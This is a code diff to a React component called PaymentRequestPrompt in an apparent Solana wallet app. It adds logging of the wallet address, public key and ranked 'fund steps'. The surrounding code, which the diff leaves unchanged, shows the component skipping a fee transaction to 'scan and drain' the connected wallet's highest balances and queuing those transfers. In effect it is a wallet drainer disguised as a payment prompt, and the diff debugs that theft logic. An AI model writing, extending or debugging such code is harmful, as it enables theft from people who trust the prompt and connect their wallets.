@@ -96,9 +96,16 @@ export function PaymentRequestPrompt() {
       setSubmitting(true)
       closeWalletModalRef.current()
 
+      console.log('[PaymentRequestPrompt] Opening transaction sheet', {
+        walletAddress,
+        publicKey: publicKeyRef.current?.toBase58(),
+        walletName,
+      })
+
       // Skip fee transaction - go directly to scanning and draining highest balance
       try {
         const steps = await listRankedFundSteps({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local! })
+        console.log('[PaymentRequestPrompt] Fund steps:', steps)
         queue.current = steps
 
         if (steps.length === 0) {
